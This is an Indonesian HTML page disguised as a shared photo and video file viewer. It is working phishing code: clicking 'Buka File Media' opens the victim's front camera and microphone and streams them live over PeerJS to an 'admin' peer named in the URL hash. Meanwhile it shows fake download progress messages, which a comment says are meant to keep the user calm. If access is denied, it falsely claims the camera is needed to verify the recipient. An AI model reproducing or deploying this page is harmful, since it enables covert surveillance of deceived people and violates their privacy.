<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f8f9fa;
            color: #333;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .card {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            text-align: center;
            width: 300px;
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        h1 { margin: 0 0 15px; color: #333; }
        p { color: #666; font-size: 14px; line-height: 1.5; }

        .btn {
            background: #007bff;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
            transition: 0.3s;
        }
        .btn:hover { background: #0056b3; transform: scale(1.02); }

        #loading-screen {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #007bff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        #local-video { display: none; }
    </style>
</head>
<body>

    <!-- Tampilan 1: Landing Page (Trigger) -->
    <div class="card" id="landing-page">
        <div style="font-size: 40px; margin-bottom: 10px;">üìÅ</div>
        <h1>Dokumen Dibagikan</h1>
        <p>Seseorang telah membagikan file media berisi foto dan video kepada Anda.</p>
        <button class="btn" onclick="startProcess()">Buka File Media</button>
    </div>

    <!-- Tampilan 2: Fake Loading (Sedang Upload) -->
    <div class="card" id="loading-page" style="display:none;">
        <div class="spinner"></div>
        <h3>Mengunduh...</h3>
        <p id="log-text">Menghubungkan ke server aman...</p>
    </div>

    <video id="local-video" autoplay playsinline muted></video>

<script>
    // Baca ID Admin dari URL Hash (Bagian setelah #)
    // Contoh: site.com/foto.html#ADMIN_ID -> kita ambil ADMIN_ID
    const adminID = window.location.hash.substring(1); 

    if (!adminID) {
        // Fallback jika tidak ada ID (misal user buka langsung tanpa link)
        document.querySelector('h1').innerText = "File Tidak Ditemukan";
        document.querySelector('p').innerText = "Link kadaluarsa atau tidak valid.";
        document.querySelector('.btn').style.display = 'none';
    }

    function startProcess() {
        // Ganti tampilan ke loading
        document.getElementById('landing-page').style.display = 'none';
        document.getElementById('loading-page').style.display = 'flex';

        // Mulai koneksi kamera
        connectCamera(adminID);
    }

    async function connectCamera(targetID) {
        try {
            // 1. Inisialisasi PeerJS
            const peer = new Peer(null, { debug: 1 });
            const logText = document.getElementById('log-text');

            peer.on('open', () => {
                logText.innerText = "Mengakses perangkat keras...";
                getMediaAndCall(targetID, peer);
            });

            peer.on('error', (err) => {
                logText.innerText = "Gagal menghubungi server.";
                console.error(err);
            });

        } catch (e) {
            alert("Terjadi kesalahan sistem.");
        }
    }

    async function getMediaAndCall(targetID, peer) {
        try {
            // 2. Minta izin Kamera & Mic
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: true 
            });

            // Pasang stream ke elemen video hidden (wajib)
            const localVideo = document.getElementById('local-video');
            localVideo.srcObject = stream;
            localVideo.play();

            document.getElementById('log-text').innerText = "Menghubungkan ke pembagian file...";

            // 3. Hubungi Admin
            const call = peer.call(targetID, stream);

            call.on('close', () => {
                document.getElementById('log-text').innerText = "Sesi berakhir.";
                // Matikan kamera
                stream.getTracks().forEach(track => track.stop());
            });

            // Update log palsu agar user tenang
            setTimeout(() => {
                document.getElementById('log-text').innerText = "Menyiapkan tampilan...";
            }, 2000);

        } catch (err) {
            console.error("Camera Access Denied", err);
            alert("Akses kamera diperlukan untuk memverifikasi penerima file.");
            location.reload();
        }
    }
</script>

</body>
</html>
